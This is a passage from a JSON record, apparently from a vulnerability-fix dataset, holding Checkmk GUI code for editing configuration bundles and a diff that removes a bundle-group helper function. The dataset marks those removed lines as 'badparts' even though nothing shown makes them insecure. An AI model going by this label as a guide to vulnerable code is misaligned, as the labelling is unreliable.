self._bundle[\"title\"],\n                    \"_comment\": self._bundle[\"comment\"],\n                },\n            )\n            forms.end()\n            html.hidden_fields()\n\n    def _sub_page_rule(self) -> None:\n        html.h1(_(\"Rule\"), class_=[\"edit_configuration_bundle_header\"])\n        self._edit_rule.page()\n\n    def _sub_page_host(self) -> None:\n        html.h1(_(\"Host\"), class_=[\"edit_configuration_bundle_header\"])\n        self._edit_host.page()\n\n    def _sub_page_dcd_connection(self) -> None:\n        if any(edit_dcd_connection for edit_dcd_connection in self._edit_dcd_connections):\n            html.h1(_(\"Dynamic host management\"), class_=[\"edit_configuration_bundle_header\"])\n            for index, edit_dcd_connection in enumerate(self._edit_dcd_connections):\n                if edit_dcd_connection:\n                    edit_dcd_connection.page(f\"edit_dcd_{index}\")\n\n    def _sub_page_password(self) -> None:\n        if self._edit_passwords:\n            html.h1(_(\"Password\"), class_=[\"edit_configuration_bundle_header\"])\n            for index, edit_password in enumerate(self._edit_passwords):\n                edit_password.page(f\"edit_password_{index}\")\n\n    def page(self) -> None:\n        with html.form_context(\"bulk\", method=\"POST\"):\n            forms.end()\n            html.hidden_fields()\n        match self._rule_group_type:\n            case RuleGroupType.SPECIAL_AGENTS:\n                self._sub_page_configuration()\n                self._sub_page_rule()\n                self._sub_page_host()\n                self._sub_page_dcd_connection()\n                self._sub_page_password()\n            case _:\n                raise MKUserError(\n                    None,\n                    _(\"No edit configuration bundle implemented for bundle group type '%s'.\")\n                    % self._bundle_group,\n                )\n\n    def _form_names(self) -> Iterator[str]:\n        yield \"edit_bundle\"\n        if self._edit_rule:\n            yield \"rule_editor\"\n        if self._edit_host:\n            yield \"edit_host\"\n        yield from (f\"edit_dcd_{index}\" for index in range(len(self._edit_dcd_connections)))\n        yield from (f\"edit_password_{index}\" for index in range(len(self._edit_passwords)))\n\n    def _page_menu_action_entries(self) -> Iterator[PageMenuEntry]:\n        form_names = list(self._form_names())\n        yield PageMenuEntry(\n            title=_(\"Save\"),\n            icon_name=\"services\",\n            item=make_form_bulk_submit_link(\n                bulk_form_name=\"bulk\", form_names=form_names, button_name=\"_save\"\n            ),\n            is_shortcut=False,\n        )\n        yield PageMenuEntry(\n            title=_(\"Save & go to service discovery\"),\n            icon_name=\"services_green\",\n            item=make_form_bulk_submit_link(\n                bulk_form_name=\"bulk\",\n                form_names=form_names,\n                button_name=\"_save_and_go_to_service_discovery\",\n            ),\n            is_shortcut=True,\n        )\n        yield PageMenuEntry(\n            title=_(\"Cancel\"),\n            icon_name=\"cancel\",\n            item=make_simple_link(\"\"),\n            is_shortcut=True,\n        )\n\n    def _page_menu_related_entries(self) -> Iterator[PageMenuEntry]:\n        yield PageMenuEntry(\n            title=_(\"TBD\"),\n            icon_name=\"\",\n            item=make_simple_link(\"\"),\n        )\n\n    def action(self) -> ActionResult:\n        check_csrf_token()\n        if not transactions.check_transaction():\n            return redirect(self.mode_url(bundle_id=self._bundle_id))\n\n        if request.has_var(\"_save\"):\n            self._action_save()\n            return redirect(self.mode_url(bundle_id=self._bundle_id))\n\n        if request.has_var(\"_save_and_go_to_service_discovery\"):\n            self._action_save()\n            host = self._edit_host.host\n            folder = folder_from_request(request.var(\"folder\"), host.name())\n            return redirect(mode_url(\"inventory\", folder=folder.path(), host=host.name()))\n\n        return redirect(self.mode_url(bundle_id=self._bundle_id))\n\n    def page_menu(self, breadcrumb: Breadcrumb) -> PageMenu:\n        return PageMenu(\n            dropdowns=[\n                PageMenuDropdown(\n                    name=\"actions\",\n                    title=_(\"Configuration\"),\n                    topics=[\n                        PageMenuTopic(\n                            title=_(\"Actions\"),\n                            entries=list(self._page_menu_action_entries()),\n                        ),\n                    ],\n                ),\n                PageMenuDropdown(\n                    name=\"actions\",\n                    title=_(\"Related\"),\n                    topics=[\n                        PageMenuTopic(\n                            title=_(\"Related\"),\n                            entries=list(self._page_menu_related_entries()),\n                        ),\n                    ],\n                ),\n            ],\n            breadcrumb=breadcrumb,\n        )\n\n    def _save_config_bundle_configuration(self) -> None:\n        vs = self._configuration_vs(self._bundle_id)\n        config = vs.from_html_vars(\"edit_bundle_options\")\n        vs.validate_value(config, \"edit_bundle_options\")\n        self._bundle[\"title\"] = config[\"_name\"]\n        self._bundle[\"comment\"] = config[\"_comment\"]\n        edit_config_bundle_configuration(self._bundle_id, self._bundle)\n\n    def _set_vars(self, all_vars: Mapping[str, Sequence[tuple[str, str]]], form_name: str) -> None:\n        request.del_vars()\n        for var in all_vars[form_name]:\n            request.set_var(var[0].replace(form_name + \"_\", \"\"), var[1])\n        request.set_var(\"_transid\", transactions.fresh_transid())\n        transactions.store_new()\n\n    def _action_save(self) -> None:\n        all_vars = {\n            form_name: list(request.itervars(form_name)) for form_name in self._form_names()\n        }\n        self._save_config_bundle_configuration()\n        if self._edit_host:\n            self._set_vars(all_vars, \"edit_host\")\n            self._edit_host.action()\n        if self._edit_rule:\n            self._set_vars(all_vars, \"rule_editor\")\n            self._edit_rule.action()\n        if self._edit_passwords:\n            for index, edit_password in enumerate(self._edit_passwords):\n                self._set_vars(all_vars, f\"edit_password_{index}\")\n                edit_password.action()\n        if self._edit_dcd_connections:\n            for index, edit_dcd_connection in enumerate(self._edit_dcd_connections):\n                if edit_dcd_connection:\n                    self._set_vars(all_vars, f\"edit_dcd_connection_{index}\")\n                    edit_dcd_connection.action()\n"
                },
                "/cmk/gui/watolib/configuration_bundles.py": {
                    "changes": [
                        {
                            "diff": "\n     dcd_connections: Sequence[tuple[str, DCDConnectionSpec]] | None = None\n \n \n-def identify_bundle_group_type(bundle_group: str) -> RuleGroupType:\n-    if bundle_group.startswith(RuleGroupType.SPECIAL_AGENTS.value):\n-        return RuleGroupType.SPECIAL_AGENTS\n-    raise ValueError(f\"Unknown bundle group: {bundle_group}\")\n-\n-\n def valid_special_agent_bundle(bundle: BundleReferences) -> bool:\n     host_conditions = bundle.hosts is not None and len(bundle.hosts) == 1\n     rule_conditions = bundle.rules is not None and len(bundle.rules) == 1\n",
                            "add": 0,
                            "remove": 6,
                            "filename": "/cmk/gui/watolib/configuration_bundles.py",
                            "badparts": [
                                "def identify_bundle_group_type(bundle_group: str) -> RuleGroupType:",
                                "    if bundle_group.startswith(RuleGroupType.SPECIAL_AGENTS.value):",
                                "        return RuleGroupType.SPECIAL_AGENTS",
                                "    raise ValueError(f\"Unknown bundle group: {bundle_group}\")"
                            ],
                            "goodparts": []
                        }
                    ],
                    "source": "\n from dataclasses import dataclass from itertools import groupby from operator import itemgetter from pathlib import Path from typing import( Any, Callable, get_args, Iterable, Literal, Mapping, NewType, NotRequired, Sequence, TypedDict, TypeVar, ) from cmk.ccc.exceptions import MKGeneralException from cmk.ccc.site import omd_site from cmk.utils.global_ident_type import GlobalIdent, PROGRAM_ID_QUICK_SETUP from cmk.utils.hostaddress import HostName from cmk.utils.password_store import Password from cmk.utils.rulesets.definition import RuleGroupType from cmk.utils.rulesets.ruleset_matcher import RuleSpec from cmk.gui.watolib import check_mk_automations from cmk.gui.watolib.host_attributes import HostAttributes from cmk.gui.watolib.hosts_and_folders import Folder, folder_tree, Host from cmk.gui.watolib.passwords import load_passwords, remove_password, save_password from cmk.gui.watolib.rulesets import AllRulesets, FolderRulesets, Rule, SingleRulesetRecursively from cmk.gui.watolib.simple_config_file import ConfigFileRegistry, WatoSingleConfigFile from cmk.gui.watolib.utils import multisite_dir _T=TypeVar(\"_T\") BundleId=NewType(\"BundleId\", str) IdentFinder=Callable[[GlobalIdent | None], BundleId | None] Entity=Literal[\"host\", \"rule\", \"password\", \"dcd\"] Permission=Literal[\"hosts\", \"rulesets\", \"passwords\", \"dcd_connections\"] DCDConnectionSpec=dict[str, Any] DCDConnectionDict=dict[str, DCDConnectionSpec] @dataclass(frozen=True) class DomainDefinition: entity: Entity permission: Permission ALL_ENTITIES: set[Entity]=set(get_args(Entity)) BUNDLE_DOMAINS: Mapping[RuleGroupType, set[DomainDefinition]]={ RuleGroupType.SPECIAL_AGENTS:{ DomainDefinition(entity=\"host\", permission=\"hosts\"), DomainDefinition(entity=\"rule\", permission=\"rulesets\"), DomainDefinition(entity=\"password\", permission=\"passwords\"), DomainDefinition(entity=\"dcd\", permission=\"dcd_connections\"), } } def _get_affected_entities(bundle_group: str) -> set[Entity]: rule_group_type=RuleGroupType(bundle_group.split(\":\", maxsplit=1)[0]) bundle_domain=BUNDLE_DOMAINS.get(rule_group_type, None) return set(domain.entity for domain in bundle_domain) if bundle_domain else ALL_ENTITIES class CreateHost(TypedDict): folder: str name: HostName attributes: HostAttributes cluster_nodes: NotRequired[Sequence[HostName]] class CreatePassword(TypedDict): id: str spec: Password class CreateRule(TypedDict): folder: str ruleset: str spec: RuleSpec[object] class CreateDCDConnection(TypedDict): id: str spec: DCDConnectionSpec @dataclass class CreateBundleEntities: hosts: Iterable[CreateHost] | None=None passwords: Iterable[CreatePassword] | None=None rules: Iterable[CreateRule] | None=None dcd_connections: Iterable[CreateDCDConnection] | None=None def _dcd_unsupported(*_args: Any, **_kwargs: Any) -> None: raise MKGeneralException(\"DCD not supported\") class DCDConnectionHook: load_dcd_connections: Callable[[], DCDConnectionDict]=lambda:{} create_dcd_connection: Callable[[str, DCDConnectionSpec], None]=_dcd_unsupported delete_dcd_connection: Callable[[str], None]=_dcd_unsupported @dataclass class BundleReferences: hosts: Sequence[Host] | None=None passwords: Sequence[tuple[str, Password]] | None=None rules: Sequence[Rule] | None=None dcd_connections: Sequence[tuple[str, DCDConnectionSpec]] | None=None def identify_bundle_group_type(bundle_group: str) -> RuleGroupType: if bundle_group.startswith(RuleGroupType.SPECIAL_AGENTS.value): return RuleGroupType.SPECIAL_AGENTS raise ValueError(f\"Unknown bundle group:{bundle_group}\") def valid_special_agent_bundle(bundle: BundleReferences) -> bool: host_conditions=bundle.hosts is not None and len(bundle.hosts)==1 rule_conditions=bundle.rules is not None and len(bundle.rules)==1 password_conditions=bundle.passwords is not None and len(bundle.passwords)==1 if not host_conditions or not rule_conditions or not password_conditions: return False return True def identify_bundle_references( bundle_group: str, bundle_ids: set[BundleId], *, rulespecs_hint: set[str] | None=None ) -> Mapping[BundleId, BundleReferences]: \"\"\"Identify the configuration references of the configuration bundles.\"\"\" bundle_id_finder=_prepare_bundle_id_finder(PROGRAM_ID_QUICK_SETUP, bundle_ids) affected_entities=_get_affected_entities(bundle_group) bundle_rule_ids=( _collect_many( _collect_rules(finder=bundle_id_finder, rules=_iter_all_rules(rulespecs_hint)) ) if \"rule\" in affected_entities else{} ) bundle_password_ids=( _collect_many(_collect_passwords(finder=bundle_id_finder, passwords=load_passwords())) if \"password\" in affected_entities else{} ) bundle_hosts=( _collect_many(_collect_hosts(finder=bundle_id_finder, hosts=Host.all().values())) if \"host\" in affected_entities else{} ) bundle_dcd_connections=( _collect_many( _collect_dcd_connections( finder=bundle_id_finder, dcd_connections=DCDConnectionHook.load_dcd_connections() ) ) if \"dcd\" in affected_entities else{} ) return{ bundle_id: BundleReferences( hosts=bundle_hosts.get(bundle_id), passwords=bundle_password_ids.get(bundle_id), rules=bundle_rule_ids.get(bundle_id), dcd_connections=bundle_dcd_connections.get(bundle_id), ) for bundle_id in bundle_ids } def identify_single_bundle_references( bundle_id: BundleId, bundle_group: str | None=None ) -> BundleReferences: \"\"\"Get references for a single bundle. If the bundle group is unknown, the bundle will be loaded first.\"\"\" group=bundle_group or read_config_bundle(bundle_id)[\"group\"] references=identify_bundle_references(group,{bundle_id}) return references[bundle_id] def read_config_bundle(bundle_id: BundleId) -> \"ConfigBundle\": store=ConfigBundleStore() all_bundles=store.load_for_reading() if bundle_id in all_bundles: return all_bundles[bundle_id] raise MKGeneralException(f'Configuration bundle \"{bundle_id}\" does not exist.') def edit_config_bundle_configuration(bundle_id: BundleId, bundle: \"ConfigBundle\") -> None: store=ConfigBundleStore() all_bundles=store.load_for_modification() if bundle_id not in all_bundles: raise MKGeneralException(f'Configuration bundle \"{bundle_id}\" does not exist.') all_bundles[bundle_id]=bundle store.save(all_bundles) def create_config_bundle( bundle_id: BundleId, bundle: \"ConfigBundle\", entities: CreateBundleEntities ) -> None: bundle_ident=GlobalIdent( site_id=omd_site(), program_id=bundle[\"program_id\"], instance_id=bundle_id ) store=ConfigBundleStore() all_bundles=store.load_for_modification() if bundle_id in all_bundles: raise MKGeneralException(f'Configuration bundle \"{bundle_id}\" already exists.') all_bundles[bundle_id]=bundle store.save(all_bundles) try: if entities.passwords: _create_passwords(bundle_ident, entities.passwords) if entities.hosts: _create_hosts(bundle_ident, entities.hosts) if entities.rules: _create_rules(bundle_ident, entities.rules) if entities.dcd_connections: _create_dcd_connections(bundle_ident, entities.dcd_connections) except Exception as e: delete_config_bundle(bundle_id) raise MKGeneralException(f\"Failed to create configuration bundle{bundle_id}\") from e def delete_config_bundle(bundle_id: BundleId) -> None: store=ConfigBundleStore() all_bundles=store.load_for_modification() if(bundle:=all_bundles.pop(bundle_id, None)) is None: raise MKGeneralException(f'Configuration bundle \"{bundle_id}\" does not exist.') references=identify_bundle_references(bundle[\"group\"],{bundle_id})[bundle_id] if references.rules: _delete_rules(references.rules) if references.hosts: _delete_hosts(references.hosts) if references.passwords: _delete_passwords(references.passwords) if references.dcd_connections: _delete_dcd_connections(references.dcd_connections) store.save(all_bundles) def _collect_many(values: Iterable[tuple[BundleId, _T]]) -> Mapping[BundleId, Sequence[_T]]: mapping: dict[BundleId, list[_T]]={} for bundle_id, value in values: if bundle_id in mapping: mapping[bundle_id].append(value) else: mapping[bundle_id]=[value] return mapping def _collect_hosts(finder: IdentFinder, hosts: Iterable[Host]) -> Iterable[tuple[BundleId, Host]]: for host in hosts: if bundle_id:=finder(host.locked_by()): yield bundle_id, host def _get_host_attributes(bundle_ident: GlobalIdent, params: CreateHost) -> HostAttributes: attributes=params[\"attributes\"] attributes[\"locked_by\"]=[ bundle_ident[\"site_id\"], bundle_ident[\"program_id\"], bundle_ident[\"instance_id\"], ] return attributes def _create_hosts(bundle_ident: GlobalIdent, hosts: Iterable[CreateHost]) -> None: folder_getter=itemgetter(\"folder\") hosts_sorted_by_folder: list[CreateHost]=sorted(hosts, key=folder_getter) folder_and_valid_hosts=[] for folder_name, hosts_iter in groupby( hosts_sorted_by_folder, key=folder_getter ): folder=folder_tree().folder(folder_name) folder.prepare_create_hosts() valid_hosts=[ ( host[\"name\"], folder.verify_and_update_host_details( host[\"name\"], _get_host_attributes(bundle_ident, host), ), host.get(\"cluster_nodes\"), ) for host in hosts_iter ] folder_and_valid_hosts.append((folder, valid_hosts)) for folder, valid_hosts in folder_and_valid_hosts: folder.create_validated_hosts(valid_hosts) def _delete_hosts(hosts: Iterable[Host]) -> None: folder_getter=itemgetter(0) folders_and_hosts=sorted( ((host.folder(), host) for host in hosts), key=folder_getter, ) for folder, host_iter in groupby( folders_and_hosts, key=folder_getter ): host_names=[host.name() for _folder, host in host_iter] folder.delete_hosts( host_names, automation=check_mk_automations.delete_hosts, allow_locked_deletion=True ) def _collect_passwords( finder: IdentFinder, passwords: Mapping[str, Password] ) -> Iterable[tuple[BundleId, tuple[str, Password]]]: for password_id, password in passwords.items(): if bundle_id:=finder(password.get(\"locked_by\")): yield bundle_id,(password_id, password) def _create_passwords(bundle_ident: GlobalIdent, passwords: Iterable[CreatePassword]) -> None: for password in passwords: spec=password[\"spec\"] spec[\"locked_by\"]=bundle_ident save_password(password[\"id\"], spec, new_password=True) def _delete_passwords(passwords: Iterable[tuple[str, Password]]) -> None: for password_id, _password in passwords: remove_password(password_id) def _iter_all_rules(rulespecs: set[str] | None) -> Iterable[tuple[Folder, int, Rule]]: if rulespecs: for rulespec in rulespecs: ruleset=SingleRulesetRecursively.load_single_ruleset_recursively(rulespec).get( rulespec ) yield from ruleset.get_rules() else: all_rulesets=AllRulesets.load_all_rulesets() for ruleset in all_rulesets.get_rulesets().values(): yield from ruleset.get_rules() def _collect_rules( finder: IdentFinder, rules: Iterable[tuple[Folder, int, Rule]] ) -> Iterable[tuple[BundleId, Rule]]: for _folder, _idx, rule in rules: if bundle_id:=finder(rule.locked_by): yield bundle_id, rule def _create_rules(bundle_ident: GlobalIdent, rules: Iterable[CreateRule]) -> None: sorted_rules=sorted(rules, key=itemgetter(\"folder\", \"ruleset\")) for folder_name, rule_iter_outer in groupby( sorted_rules, key=itemgetter(\"folder\") ): folder=folder_tree().folder(folder_name) rulesets=FolderRulesets.load_folder_rulesets(folder) for ruleset_name, rule_iter_inner in groupby( rule_iter_outer, key=itemgetter(\"ruleset\") ): ruleset=rulesets.get(ruleset_name) for create_rule in rule_iter_inner: rule=Rule.from_config(folder, ruleset, create_rule[\"spec\"]) rule.locked_by=bundle_ident ruleset.append_rule(folder, rule) rulesets.save_folder() def _delete_rules(rules: Iterable[Rule]) -> None: folder_getter=itemgetter(0) sorted_rules=sorted(((rule.folder, rule) for rule in rules), key=folder_getter) for folder, rule_iter in groupby( sorted_rules, key=folder_getter ): rulesets=FolderRulesets.load_folder_rulesets(folder) for _folder, rule in rule_iter: ruleset=rulesets.get(rule.ruleset.name) actual_rule=ruleset.get_rule_by_id(rule.id) rulesets.get(rule.ruleset.name).delete_rule(actual_rule) rulesets.save_folder() def _collect_dcd_connections( finder: IdentFinder, dcd_connections: DCDConnectionDict ) -> Iterable[tuple[BundleId, tuple[str, DCDConnectionSpec]]]: for connection_id, connection in dcd_connections.items(): if bundle_id:=finder(connection.get(\"locked_by\")): yield bundle_id,(connection_id, connection) def _create_dcd_connections( bundle_ident: GlobalIdent, dcd_connections: Iterable[CreateDCDConnection] ) -> None: for dcd_connection in dcd_connections: spec=dcd_connection[\"spec\"] spec[\"locked_by\"]=bundle_ident DCDConnectionHook.create_dcd_connection(dcd_connection[\"id\"], spec) def _delete_dcd_connections(dcd_connections: Iterable[tuple[str, DCDConnectionSpec]]) -> None: for dcd_connection_id, _spec in dcd_connections: DCDConnectionHook.delete_dcd_connection(dcd_connection_id) def _prepare_bundle_id_finder(bundle_program_id: str, bundle_ids: set[BundleId]) -> IdentFinder: def find_matching_bundle_id( ident: GlobalIdent | None, ) -> BundleId | None: if( ident is not None and ident[\"program_id\"]==bundle_program_id and ident[\"instance_id\"] in bundle_ids ): return BundleId(ident[\"instance_id\"]) return None return find_matching_bundle_id class ConfigBundle(TypedDict): \"\"\" A configuration bundle is a collection of configs which are managed together by this bundle. Each underlying config must have the locked_by attribute set to the id of the bundle. We explicitly avoid double references here to keep the data model simple. The group and program combination should determine which configuration objects are potentially part of the bundle. \"\"\" title: str comment: str group: str program_id: str customer: NotRequired[str] class ConfigBundleStore(WatoSingleConfigFile[dict[BundleId, ConfigBundle]]): def __init__(self) -> None: super().__init__( config_file_path=Path(multisite_dir()) / \"configuration_bundles.mk\", config_variable=\"configuration_bundles\", spec_class=dict[BundleId, ConfigBundle], ) def load_group_bundles(bundle_group: str) -> Mapping[BundleId, ConfigBundle]: all_bundles=ConfigBundleStore().load_for_reading() return{ bundle_id: bundle for bundle_id, bundle in all_bundles.items() if bundle[\"group\"]==bundle_group } def register(config_file_registry: ConfigFileRegistry) -> None: config_file_registry.register(ConfigBundleStore()) ",
                    "sourceWithComments": "#!/usr/bin/env python3\n# Copyright (C) 2024 Checkmk GmbH - License: GNU General Public License v2\n# This file is part of Checkmk (https://checkmk.com). It is subject to the terms and\n# conditions defined in the file COPYING, which is part of this source code package.\n\nfrom dataclasses import dataclass\nfrom itertools import groupby\nfrom operator import itemgetter\nfrom pathlib import Path\nfrom typing import (\n    Any,\n    Callable,\n    get_args,\n    Iterable,\n    Literal,\n    Mapping,\n    NewType,\n    NotRequired,\n    Sequence,\n    TypedDict,\n    TypeVar,\n)\n\nfrom cmk.ccc.exceptions import MKGeneralException\nfrom cmk.ccc.site import omd_site\n\nfrom cmk.utils.global_ident_type import GlobalIdent, PROGRAM_ID_QUICK_SETUP\nfrom cmk.utils.hostaddress import HostName\nfrom cmk.utils.password_store import Password\nfrom cmk.utils.rulesets.definition import RuleGroupType\nfrom cmk.utils.rulesets.ruleset_matcher import RuleSpec\n\nfrom cmk.gui.watolib import check_mk_automations\nfrom cmk.gui.watolib.host_attributes import HostAttributes\nfrom cmk.gui.watolib.hosts_and_folders import Folder, folder_tree, Host\nfrom cmk.gui.watolib.passwords import load_passwords, remove_password, save_password\nfrom cmk.gui.watolib.rulesets import AllRulesets, FolderRulesets, Rule, SingleRulesetRecursively\nfrom cmk.gui.watolib.simple_config_file import ConfigFileRegistry, WatoSingleConfigFile\nfrom cmk.gui.watolib.utils import multisite_dir\n\n_T = TypeVar(\"_T\")\nBundleId = NewType(\"BundleId\", str)\nIdentFinder = Callable[[GlobalIdent | None], BundleId | None]\nEntity = Literal[\"host\", \"rule\", \"password\", \"dcd\"]\nPermission = Literal[\"hosts\", \"rulesets\", \"passwords\", \"dcd_connections\"]\n\n# TODO: deduplicate with cmk/gui/cee/dcd/_store.py\nDCDConnectionSpec = dict[str, Any]\nDCDConnectionDict = dict[str, DCDConnectionSpec]\n\n\n@dataclass(frozen=True)\nclass DomainDefinition:\n    entity: Entity\n    permission: Permission\n\n\nALL_ENTITIES: set[Entity] = set(get_args(Entity))\nBUNDLE_DOMAINS: Mapping[RuleGroupType, set[DomainDefinition]] = {\n    RuleGroupType.SPECIAL_AGENTS: {\n        DomainDefinition(entity=\"host\", permission=\"hosts\"),\n        DomainDefinition(entity=\"rule\", permission=\"rulesets\"),\n        DomainDefinition(entity=\"password\", permission=\"passwords\"),\n        DomainDefinition(entity=\"dcd\", permission=\"dcd_connections\"),\n    }\n}\n\n\ndef _get_affected_entities(bundle_group: str) -> set[Entity]:\n    rule_group_type = RuleGroupType(bundle_group.split(\":\", maxsplit=1)[0])\n    bundle_domain = BUNDLE_DOMAINS.get(rule_group_type, None)\n    return set(domain.entity for domain in bundle_domain) if bundle_domain else ALL_ENTITIES\n\n\nclass CreateHost(TypedDict):\n    folder: str\n    name: HostName\n    attributes: HostAttributes\n    cluster_nodes: NotRequired[Sequence[HostName]]\n\n\nclass CreatePassword(TypedDict):\n    id: str\n    spec: Password\n\n\nclass CreateRule(TypedDict):\n    folder: str\n    ruleset: str\n    spec: RuleSpec[object]\n\n\nclass CreateDCDConnection(TypedDict):\n    id: str\n    spec: DCDConnectionSpec\n\n\n@dataclass\nclass CreateBundleEntities:\n    hosts: Iterable[CreateHost] | None = None\n    passwords: Iterable[CreatePassword] | None = None\n    rules: Iterable[CreateRule] | None = None\n    dcd_connections: Iterable[CreateDCDConnection] | None = None\n\n\ndef _dcd_unsupported(*_args: Any, **_kwargs: Any) -> None:\n    raise MKGeneralException(\"DCD not supported\")\n\n\nclass DCDConnectionHook:\n    load_dcd_connections: Callable[[], DCDConnectionDict] = lambda: {}\n    create_dcd_connection: Callable[[str, DCDConnectionSpec], None] = _dcd_unsupported\n    delete_dcd_connection: Callable[[str], None] = _dcd_unsupported\n\n\n@dataclass\nclass BundleReferences:\n    hosts: Sequence[Host] | None = None\n    passwords: Sequence[tuple[str, Password]] | None = None  # PasswordId, Password\n    rules: Sequence[Rule] | None = None\n    dcd_connections: Sequence[tuple[str, DCDConnectionSpec]] | None = None\n\n\ndef identify_bundle_group_type(bundle_group: str) -> RuleGroupType:\n    if bundle_group.startswith(RuleGroupType.SPECIAL_AGENTS.value):\n        return RuleGroupType.SPECIAL_AGENTS\n    raise ValueError(f\"Unknown bundle group: {bundle_group}\")\n\n\ndef valid_special_agent_bundle(bundle: BundleReferences) -> bool:\n    host_conditions = bundle.hosts is not None and len(bundle.hosts) == 1\n    rule_conditions = bundle.rules is not None and len(bundle.rules) == 1\n    password_conditions = bundle.passwords is not None and len(bundle.passwords) == 1\n    if not host_conditions or not rule_conditions or not password_conditions:\n        return False\n    return True\n\n\ndef identify_bundle_references(\n    bundle_group: str, bundle_ids: set[BundleId], *, rulespecs_hint: set[str] | None = None\n) -> Mapping[BundleId, BundleReferences]:\n    \"\"\"Identify the configuration references of the configuration bundles.\"\"\"\n    bundle_id_finder = _prepare_bundle_id_finder(PROGRAM_ID_QUICK_SETUP, bundle_ids)\n    affected_entities = _get_affected_entities(bundle_group)\n\n    bundle_rule_ids = (\n        _collect_many(\n            _collect_rules(finder=bundle_id_finder, rules=_iter_all_rules(rulespecs_hint))\n        )\n        if \"rule\" in affected_entities\n        else {}\n    )\n    bundle_password_ids = (\n        _collect_many(_collect_passwords(finder=bundle_id_finder, passwords=load_passwords()))\n        if \"password\" in affected_entities\n        else {}\n    )\n    bundle_hosts = (\n        _collect_many(_collect_hosts(finder=bundle_id_finder, hosts=Host.all().values()))\n        if \"host\" in affected_entities\n        else {}\n    )\n    bundle_dcd_connections = (\n        _collect_many(\n            _collect_dcd_connections(\n                finder=bundle_id_finder, dcd_connections=DCDConnectionHook.load_dcd_connections()\n            )\n        )\n        if \"dcd\" in affected_entities\n        else {}\n    )\n    return {\n        bundle_id: BundleReferences(\n            hosts=bundle_hosts.get(bundle_id),\n            passwords=bundle_password_ids.get(bundle_id),\n            rules=bundle_rule_ids.get(bundle_id),\n            dcd_connections=bundle_dcd_connections.get(bundle_id),\n        )\n        for bundle_id in bundle_ids\n    }\n\n\ndef identify_single_bundle_references(\n    bundle_id: BundleId, bundle_group: str | None = None\n) -> BundleReferences:\n    \"\"\"Get references for a single bundle.\n    If the bundle group is unknown, the bundle will be loaded first.\"\"\"\n    group = bundle_group or read_config_bundle(bundle_id)[\"group\"]\n    references = identify_bundle_references(group, {bundle_id})\n    return references[bundle_id]\n\n\ndef read_config_bundle(bundle_id: BundleId) -> \"ConfigBundle\":\n    store = ConfigBundleStore()\n    all_bundles = store.load_for_reading()\n    if bundle_id in all_bundles:\n        return all_bundles[bundle_id]\n\n    raise MKGeneralException(f'Configuration bundle \"{bundle_id}\" does not exist.')\n\n\ndef edit_config_bundle_configuration(bundle_id: BundleId, bundle: \"ConfigBundle\") -> None:\n    store = ConfigBundleStore()\n    all_bundles = store.load_for_modification()\n    if bundle_id not in all_bundles:\n        raise MKGeneralException(f'Configuration bundle \"{bundle_id}\" does not exist.')\n    all_bundles[bundle_id] = bundle\n    store.save(all_bundles)\n\n\ndef create_config_bundle(\n    bundle_id: BundleId, bundle: \"ConfigBundle\", entities: CreateBundleEntities\n) -> None:\n    bundle_ident = GlobalIdent(\n        site_id=omd_site(), program_id=bundle[\"program_id\"], instance_id=bundle_id\n    )\n    store = ConfigBundleStore()\n    all_bundles = store.load_for_modification()\n    if bundle_id in all_bundles:\n        raise MKGeneralException(f'Configuration bundle \"{bundle_id}\" already exists.')\n    all_bundles[bundle_id] = bundle\n    store.save(all_bundles)\n\n    try:\n        if entities.passwords:\n            _create_passwords(bundle_ident, entities.passwords)\n        if entities.hosts:\n            _create_hosts(bundle_ident, entities.hosts)\n        if entities.rules:\n            _create_rules(bundle_ident, entities.rules)\n        if entities.dcd_connections:\n            _create_dcd_connections(bundle_ident, entities.dcd_connections)\n    except Exception as e:\n        # TODO: CMK-18626 (validate and create function for each config object should be separate)\n        #  and everything should be validated first before we commit to any save actions\n        delete_config_bundle(bundle_id)\n        raise MKGeneralException(f\"Failed to create configuration bundle {bundle_id}\") from e\n\n\ndef delete_config_bundle(bundle_id: BundleId) -> None:\n    store = ConfigBundleStore()\n    all_bundles = store.load_for_modification()\n    if (bundle := all_bundles.pop(bundle_id, None)) is None:\n        raise MKGeneralException(f'Configuration bundle \"{bundle_id}\" does not exist.')\n\n    references = identify_bundle_references(bundle[\"group\"], {bundle_id})[bundle_id]\n    # delete resources in inverse order to create, as rules may reference hosts for example\n    if references.rules:\n        _delete_rules(references.rules)\n    if references.hosts:\n        _delete_hosts(references.hosts)\n    if references.passwords:\n        _delete_passwords(references.passwords)\n    if references.dcd_connections:\n        _delete_dcd_connections(references.dcd_connections)\n\n    store.save(all_bundles)\n\n\ndef _collect_many(values: Iterable[tuple[BundleId, _T]]) -> Mapping[BundleId, Sequence[_T]]:\n    mapping: dict[BundleId, list[_T]] = {}\n    for bundle_id, value in values:\n        if bundle_id in mapping:\n            mapping[bundle_id].append(value)\n        else:\n            mapping[bundle_id] = [value]\n\n    return mapping\n\n\ndef _collect_hosts(finder: IdentFinder, hosts: Iterable[Host]) -> Iterable[tuple[BundleId, Host]]:\n    for host in hosts:\n        if bundle_id := finder(host.locked_by()):\n            yield bundle_id, host\n\n\ndef _get_host_attributes(bundle_ident: GlobalIdent, params: CreateHost) -> HostAttributes:\n    attributes = params[\"attributes\"]\n    attributes[\"locked_by\"] = [\n        bundle_ident[\"site_id\"],\n        bundle_ident[\"program_id\"],\n        bundle_ident[\"instance_id\"],\n    ]\n    return attributes\n\n\ndef _create_hosts(bundle_ident: GlobalIdent, hosts: Iterable[CreateHost]) -> None:\n    folder_getter = itemgetter(\"folder\")\n    hosts_sorted_by_folder: list[CreateHost] = sorted(hosts, key=folder_getter)\n    folder_and_valid_hosts = []\n    for folder_name, hosts_iter in groupby(\n        hosts_sorted_by_folder, key=folder_getter\n    ):  # type: str, Iterable[CreateHost]\n        folder = folder_tree().folder(folder_name)\n        folder.prepare_create_hosts()\n        valid_hosts = [\n            (\n                host[\"name\"],\n                folder.verify_and_update_host_details(\n                    host[\"name\"],\n                    _get_host_attributes(bundle_ident, host),\n                ),\n                host.get(\"cluster_nodes\"),\n            )\n            for host in hosts_iter\n        ]\n        folder_and_valid_hosts.append((folder, valid_hosts))\n\n    for folder, valid_hosts in folder_and_valid_hosts:\n        folder.create_validated_hosts(valid_hosts)\n\n\ndef _delete_hosts(hosts: Iterable[Host]) -> None:\n    folder_getter = itemgetter(0)\n    folders_and_hosts = sorted(\n        ((host.folder(), host) for host in hosts),\n        key=folder_getter,\n    )\n    for folder, host_iter in groupby(\n        folders_and_hosts, key=folder_getter\n    ):  # type: Folder, Iterable[tuple[Folder, Host]]\n        host_names = [host.name() for 